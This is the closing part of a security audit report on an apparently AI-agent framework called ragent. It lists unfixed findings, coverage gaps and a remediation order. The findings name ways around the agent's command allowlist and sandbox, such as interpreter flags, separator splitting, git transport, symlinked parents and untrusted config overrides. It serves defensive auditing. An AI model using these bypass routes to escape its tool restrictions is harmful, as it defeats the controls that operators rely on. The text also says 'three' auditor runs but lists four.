- **Regressed / incomplete fix:** `ragent-bench` T-009 (SEC-003) — the interpreter allowlist still admits `python3 -c`/`node -e` and validates only the first argv token. `ragent-tools-extended` T-033 (SEC-014) — per-hop redirect re-validation was never implemented. `ragent-codeindex` SEC-ragent-codeindex-007 (SEC-016) — the FTS symlink guard checks only the leaf and misses a symlinked parent.

### Coverage gaps / timeouts

- Three auditor runs (`ragent-server-security`, `ragent-tools-vcs-security`, `ragent-tui-security`, `ragent-research-security`) hit the 3600 s agent timeout on their first pass; each was re-run with a reduced read budget and completed.
- `ragent-agent`: `os_info.rs` (1 948 lines), `session/processor.rs` (4 782 lines) and `agent/mod.rs` (3 251 lines) were sampled rather than read in full; the agent-profile permission plumbing was traced but not audited end-to-end.
- `ragent-tools-extended`: `masterfetch/{envelope,focus,links,consensus,urlnorm,language}` heuristics and `project_scaffold/recipes.rs` were spot-checked; `memory/embedding.rs` was not read in full.
- `ragent-server`: `sse.rs` (1 233 lines) was sampled around redaction sites; the `openapi.rs` per-route `auth` flags were not exhaustively diffed against the router.
- `ragent-codeindex`: `parser/{gradle,gradle_kts,openscad,hcl}.rs` extraction bodies were skimmed only.
- No `cargo audit` / `cargo deny` dependency-advisory scan was run as part of this audit; `ragent-telemetry`'s stale `async-std` comment was checked against `Cargo.lock` (no `async-std` present) and is a doc-only issue.

## Suggested remediation order

1. **SEC-001, SEC-002, SEC-005** — one change in `Config::merge_project`: strip `mcp`, `acp`, and `provider.<id>.api` from the untrusted project overlay, exactly as `hooks`/`openai` already are. This closes two criticals and a high with a single, well-understood edit.
2. **SEC-003, SEC-004** — remove the interpreters from the benchmark allowlist (or validate the full argv) and treat `source_extension` as an identifier.
3. **SEC-006, SEC-016, SEC-018, SEC-025, SEC-030, SEC-059** — a shared "refuse symlinks, canonicalise-or-reject" guard applied at the existing containment chokepoints.
4. **SEC-011, SEC-012, SEC-017, SEC-010** — close the four command-execution/allowlist-bypass paths (bash single-separator split, git transport, skill dynamic context, Windows `open`).
5. **SEC-014, SEC-015** — redirect re-validation and host-suffix tightening in masterfetch.
6. **SEC-022, SEC-023, SEC-024, SEC-052** — the secret-handling cluster (owner-only config writes, fail-closed deny globs, allow-list tool attribute).
